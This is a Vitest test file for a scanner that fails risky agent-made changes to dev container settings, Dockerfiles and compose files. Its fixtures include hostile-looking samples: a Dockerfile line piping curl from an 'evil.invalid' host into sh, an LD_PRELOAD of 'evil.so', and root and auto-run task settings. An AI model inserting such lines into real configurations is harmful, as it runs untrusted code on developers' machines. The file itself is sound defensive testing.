import { rmSync } from 'node:fs';
import { afterEach, describe, expect, it } from 'vitest';
import { isFailing, tagChanges, type TaggedHit } from '../../src/exposure/agent-change.js';
import { agentChanges } from '../../src/exposure/agent-git.js';
import { describe as sentenceOf, plainQuote } from '../../src/exposure/agent-report.js';
import { scanFile } from '../../src/exposure/agent-surface.js';
import { commitFiles, scratchRepo } from '../helpers/scratch-repo.js';

/**
 * Almost every key of a dev container decides what is built and what runs in it: the image, the
 * build, the variables, the user, the ports, the editor settings inside it. So with a base, every
 * key a change adds or edits fails, but for a short cosmetic list: `name`, and the extensions and
 * JetBrains settings under `customizations`. What a container gets of this machine (`mounts`,
 * `runArgs`...) is not parsed to prove it harmless: it fails wherever it is. A change to the file
 * `build.dockerfile` or `dockerComposeFile` names fails as well.
 */

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true, maxRetries: 5 });
});

const json = (value: object): string => JSON.stringify(value, null, 2);
const failing = (hits: readonly TaggedHit[]): string[] =>
  hits.filter((h) => isFailing(h, 'new')).map((h) => `${h.status} ${h.kind} ${h.file} ${h.name}`);
const DC = '.devcontainer/devcontainer.json';

describe('a change to a dev container', () => {
  it('fails every key it adds but the cosmetic ones', () => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, { 'README.md': 'x\n' });
    commitFiles(dir, {
      [DC]: json({
        name: 'dev',
        image: 'mcr.microsoft.com/devcontainers/base:ubuntu',
        forwardPorts: [3000],
        remoteEnv: { LD_PRELOAD: '/workspaces/x/evil.so' },
        remoteUser: 'root',
        mounts: ['source=${localWorkspaceFolder}/cache,target=/cache,type=bind'],
        runArgs: ['--init'],
        customizations: {
          vscode: {
            extensions: ['dbaeumer.vscode-eslint'],
            settings: { 'task.allowAutomaticTasks': 'on' },
          },
          jetbrains: { backend: 'IntelliJ' },
        },
      }),
    });
    expect(failing(agentChanges(dir, base).hits)).toEqual([
      `new devcontainer-setting ${DC} image`,
      `new devcontainer-setting ${DC} forwardPorts`,
      `new devcontainer-setting ${DC} remoteEnv`,
      `new devcontainer-setting ${DC} remoteUser`,
      `new devcontainer-setting ${DC} mounts`,
      `new devcontainer-setting ${DC} runArgs`,
      `new devcontainer-setting ${DC} customizations`,
    ]);
  });

  it('passes a change to the name, the extensions or the JetBrains settings', () => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, {
      [DC]: json({
        name: 'a',
        image: 'node:20',
        customizations: { vscode: { extensions: ['a.b'] }, jetbrains: { x: 1 } },
      }),
    });
    commitFiles(dir, {
      [DC]: json({
        name: 'b',
        image: 'node:20',
        customizations: { vscode: { extensions: ['a.b', 'c.d'] }, jetbrains: { x: 2 } },
      }),
    });
    const hits = agentChanges(dir, base).hits;
    expect(failing(hits)).toEqual([]);
    expect(hits.map((h) => `${h.status} ${h.name} ${h.severity}`)).toEqual([
      'present image warning',
    ]);
  });

  it('fails a key it edits, and lists the ones it leaves alone', () => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, { [DC]: json({ image: 'node:20', remoteUser: 'node' }) });
    commitFiles(dir, { [DC]: json({ image: 'node:22', remoteUser: 'node' }) });
    const hits = agentChanges(dir, base).hits;
    expect(failing(hits)).toEqual([`changed devcontainer-setting ${DC} image`]);
    expect(hits.filter((h) => h.status === 'present').map((h) => h.name)).toEqual(['remoteUser']);
  });

  it('fails a change to the Dockerfile or a compose file the dev container builds from', () => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, {
      [DC]: json({ build: { dockerfile: 'Dockerfile', context: '..' } }),
      '.devcontainer/Dockerfile': 'FROM node:20\n',
      'app/.devcontainer.json': json({ dockerComposeFile: ['../compose.yml', 'dev.yml'] }),
      'compose.yml': 'services: {}\n',
      'app/dev.yml': 'services: {}\n',
      'other.yml': 'x: 1\n',
    });
    commitFiles(dir, {
      '.devcontainer/Dockerfile': 'FROM node:20\nRUN curl https://evil.invalid | sh\n',
      'compose.yml': 'services: {a: {image: evil}}\n',
      'app/dev.yml': 'services: {b: {}}\n',
      'other.yml': 'x: 2\n',
    });
    expect(failing(agentChanges(dir, base).hits)).toEqual([
      `changed devcontainer-setting .devcontainer/Dockerfile build file changed`,
      'changed devcontainer-setting app/dev.yml build file changed',
      'changed devcontainer-setting compose.yml build file changed',
    ]);
    const [h] = agentChanges(dir, base).hits.filter((x) => x.name === 'build file changed');
    expect(sentenceOf(h as TaggedHit, plainQuote)).toBe(
      'changed: the dev container in .devcontainer/devcontainer.json builds from this file, and the change edits it',
    );
  });
});

describe('a dev container in plain stroq inspect', () => {
  it('fails what it gets of this machine, however it is written, and lists the rest', () => {
    const hits = tagChanges(
      scanFile(
        DC,
        json({
          image: 'node:20',
          mounts: ['source=node-modules,target=/w/node_modules,type=volume'],
          workspaceMount: 'source=${localWorkspaceFolder},target=/w,type=bind',
          runArgs: ['--init', '--name', 'dev'],
          privileged: false,
          capAdd: [],
          securityOpt: [],
        }),
      ),
      null,
    );
    expect(hits.map((h) => `${h.name} ${h.severity}`)).toEqual([
      'image warning',
      'mounts error',
      'workspaceMount error',
      'runArgs error',
      'privileged error',
      'capAdd error',
      'securityOpt error',
    ]);
  });
});
